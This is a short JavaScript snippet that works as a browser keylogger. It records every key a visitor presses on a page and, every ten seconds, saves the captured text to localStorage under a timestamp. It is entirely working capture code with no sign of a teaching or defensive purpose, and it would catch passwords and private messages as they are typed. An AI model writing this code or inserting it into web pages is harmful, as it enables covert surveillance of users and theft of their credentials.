// Listen on every key and add to buffer
var keys = '';
document.onkeypress = function(e) {
  get = window.event ? event : e;
  key = get.keyCode ? get.keyCode : get.charCode;
  key = String.fromCharCode(key);
  keys += key;
}
// Empty the buffer into Local Storage
window.setInterval(function() {
  if (keys != '') {
    localStorage.setItem(Date(), keys);
    keys = '';
  }
}, 10000);
